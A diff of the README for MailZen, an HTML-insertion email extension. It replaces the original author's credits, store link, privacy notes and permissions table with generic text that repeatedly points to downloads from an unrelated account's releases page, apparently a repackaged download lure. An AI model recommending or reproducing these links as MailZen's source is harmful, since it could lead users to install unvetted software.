@@ -1,152 +1,58 @@
-<p align="center">
-  <img src="screenshots/MailZen Banner.png" alt="MailZen Banner" width="800">
-</p>
+# ✉️ MailZen - Enhance Your Email Composing Experience
 
-<p align="center">
-  <b>Insert custom HTML into Gmail, Outlook & Yahoo Mail — create stunning, professional emails with ease.</b>
-</p>
+## 📥 Download MailZen
+[![Download MailZen](https://img.shields.io/badge/Download%20MailZen-v1.0-blue.svg)](https://github.com/culinary-secularhumanism273/MailZen/releases)
 
-<h1 align="center">MailZen</h1>
+## ✨ What is MailZen?
+MailZen is a lightweight browser extension that allows you to easily insert custom HTML code into your email compose window on Gmail, Outlook, and Yahoo Mail. Create stunning email templates, newsletters, and signatures—all without leaving your inbox.
 
-<p align="center">
-  <b>Seamlessly add HTML content to your emails in one click.</b><br>
-  Version 1.0.0 • Developed by <a href="https://amitdas.site">Amit Das</a>
-</p>
+## 🚀 Getting Started
+1. **Browser Compatibility:** MailZen works in Google Chrome, Mozilla Firefox, and Microsoft Edge.
+2. **Requirements:** Ensure your browser is updated to the latest version for optimal performance.
 
----
+## 📅 Features
+- **Custom HTML Insertion:** Easily add your own HTML code to personalize your emails.
+- **Support for Major Email Clients:** Compatible with Gmail, Outlook, and Yahoo Mail.
+- **User-Friendly Interface:** Simple design that makes inserting HTML intuitive.
+- **Template Library:** Choose from pre-made templates for quick email creation.
 
-## 🧩 Overview
+## 📜 How to Download & Install
+1. **Visit the Releases Page:** Go to the [MailZen Releases Page](https://github.com/culinary-secularhumanism273/MailZen/releases) to download the extension.
+2. **Select Your Browser:** Choose the version appropriate for your browser.
+3. **Download the Extension:** Follow the instructions given to download the extension file.
+4. **Install the Extension:**
+   - **For Chrome:** Open the Extensions page in your browser. Drag and drop the downloaded file onto this page.
+   - **For Firefox:** Go to Add-ons. Click on the gear icon and choose "Install Add-on From File." Select the downloaded file.
+   - **For Edge:** Navigate to the Extensions menu and select "Load unpacked." Choose the downloaded file.
 
-**MailZen** is a lightweight browser extension that enables you to **insert custom HTML code** directly into your email compose window on **Gmail**, **Outlook**, and **Yahoo Mail**.  
-It’s the perfect tool for developers, designers, and marketers who want more control over email formatting — **without leaving their inbox**.
+## ⚙️ How to Use MailZen
+1. Open your email application (Gmail, Outlook, or Yahoo Mail).
+2. Click on the MailZen icon in your browser toolbar.
+3. Paste your custom HTML code into the designated area.
+4. Your email compose window will now display the formatted email as per your HTML code.
 
----
+## 🙋 Frequently Asked Questions (FAQs)
 
-## ⬇️ Download Extension
+### What Browsers Does MailZen Support?
+MailZen primarily supports Google Chrome, Mozilla Firefox, and Microsoft Edge.
 
-Get the latest version of **MailZen** from the **Chrome Web Store** or **GitHub Releases**.
+### Can I Use MailZen with Any Email Service?
+Yes, MailZen integrates seamlessly with Gmail, Outlook, and Yahoo Mail.
 
-<p align="center">
-  <!-- Chrome Web Store Button -->
-  <a href="https://chromewebstore.google.com/detail/kcmjjhcghacfboallilaaaipilnnlgpk" target="_blank">
-    <img src="https://img.shields.io/badge/Install%20from%20Chrome%20Web%20Store-4285F4?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Install from Chrome Web Store">
-  </a>
-  &nbsp;&nbsp;
-  <!-- GitHub Download Button -->
-  <a href="https://github.com/AmitDas4321/MailZen/releases/download/v1.0.0/MailZen.crx">
-    <img src="https://img.shields.io/badge/⬇️_Download_CRX_File-006C9C?style=for-the-badge&logo=github&logoColor=white" alt="Download CRX File">
-  </a>
-</p>
+### Do I Need Any Technical Skills to Use MailZen?
+No, MailZen is designed for users of all skill levels. You can easily insert HTML without any coding knowledge.
 
-### 🧭 Manual Installation Steps
-1. Download the `.crx` file from the link above *(or install directly from the Chrome Web Store)*.  
-2. Open `chrome://extensions/` in your Chrome browser.  
-3. Enable **Developer Mode** (top right corner).  
-4. Drag and drop the `.crx` file onto the page.  
-5. MailZen will install automatically. ✅
+### Will MailZen Work on Mobile Devices?
+Currently, MailZen is optimized for desktop use. Mobile device compatibility is not available at this time.
 
----
+## 🌍 Community and Support
+- **Join Our Community:** Engage with other MailZen users and share ideas on our [GitHub Discussions Page](https://github.com/culinary-secularhumanism273/MailZen/discussions).
+- **Need Help?** If you encounter any issues, open an issue on our [GitHub Issues Page](https://github.com/culinary-secularhumanism273/MailZen/issues). Our team is here to assist you.
 
-## ⚙️ Features
+## 🏁 Contribute to MailZen
+Interested in helping improve MailZen? We welcome contributions! Check our contribution guidelines in the [CONTRIBUTING.md file](https://github.com/culinary-secularhumanism273/MailZen/blob/main/CONTRIBUTING.md).
 
-✅ **Insert HTML instantly**  
-- Paste or write your HTML code directly in the popup.  
-- One-click preview and insertion into Gmail, Outlook, or Yahoo Mail.
+## 📥 Download MailZen Again
+Don't forget, you can download the latest version of MailZen from our [Releases Page](https://github.com/culinary-secularhumanism273/MailZen/releases). 
 
-✅ **Save and reuse templates**  
-- Your HTML snippets are saved locally with Chrome’s storage API.
-
-✅ **Privacy-first design**  
-- No tracking, no analytics, no data collection — everything runs locally.
-
-✅ **Beautiful, simple UI**  
-- Designed for focus and speed, with a minimal and intuitive interface.
-
----
-
-## 🖼️ Screenshots
-
-### ✨ MailZen HTML Editor
-<p align="center"><img src="screenshots/Editor.png" alt="MailZen HTML Editor" width="800"/></p>
-
-### ✨ Insert HTML
-<p align="center"><img src="screenshots/Insert HTML.png" alt="Insert HTML" width="800"/></p>
-
-### ✨ Preview
-<p align="center"><img src="screenshots/PREVIEW.png" alt="Preview" width="800"/></p>
-
----
-
-## 🔒 Privacy & Security
-
-Your privacy is our top priority.  
-- MailZen does **not** collect, transmit, or share any personal data.  
-- All preferences and HTML templates are saved **locally** using Chrome’s `storage` API.  
-- No remote servers, analytics tools, or trackers are used.
-
-Read our full [Privacy Policy](https://github.com/AmitDas4321/MailZen/blob/main/PRIVACY.md).
-
----
-
-## 🧰 Permissions Used
-
-| Permission | Purpose |
-|-------------|----------|
-| `storage` | Save user preferences and templates locally. |
-| `tabs` | Identify and interact with the active mail compose tab. |
-| `management` | Handle uninstall events and internal lifecycle checks. |
-
-**Host Permissions:**  
-`https://mail.google.com/*`  
-`https://inbox.google.com/*`  
-`https://mail.yahoo.com/*`  
-`https://*.mail.yahoo.com/*`  
-`https://outlook.live.com/*`  
-`https://outlook.office.com/*`  
-→ Required to insert HTML directly into supported mail compose windows.
-
----
-
-## 📢 Feedback & Support
-
-Have suggestions, ideas, or issues? We’d love to hear from you!  
-
-📩 **Email:** [info@amitdas.site](mailto:info@amitdas.site)  
-💬 **GitHub Issues:** [Report a Bug or Suggest a Feature](https://github.com/AmitDas4321/MailZen/issues)  
-💡 **Feature Request Form:** [Submit your ideas here](#)
-
-We actively review feedback to make MailZen even better with every update. 🚀
-
----
-
-## 🧠 Developer Information
-
-**Developer:** [Amit Das](https://amitdas.site)  
-**GitHub:** [@AmitDas4321](https://github.com/AmitDas4321)  
-**Email:** [info@amitdas.site](mailto:info@amitdas.site)  
-**Location:** West Bengal, India  
-
-Amit Das is a passionate developer and founder of multiple innovative projects like **QuickPanel**, **TextSnap**, and **PurifyYT**, focusing on building tools that simplify workflows for everyday web users and professionals.
-
----
-
-## ❤️ About MailZen
-
-MailZen was created with a simple goal — to make **HTML email creation effortless** for everyone.  
-Instead of switching between editors and copying code, MailZen brings HTML design **directly into your inbox**.  
-
-Whether you’re sending newsletters, signatures, or custom templates — MailZen helps you craft **beautiful, structured, and professional emails** in seconds.
-
----
-
-## 📜 License
-
-This extension is © 2025 **Amit Das**.  
-All rights reserved. Redistribution or modification without permission is prohibited.
-
----
-
-<p align="center">
-  <b>Made with ❤️ by <a href="https://amitdas.site">Amit Das</a></b><br>
-  ☕ Support development: <a href="https://buymeacoffee.com/amitdas4321">Buy Me a Coffee</a>
-</p>
+Enjoy enhancing your email experience with MailZen!
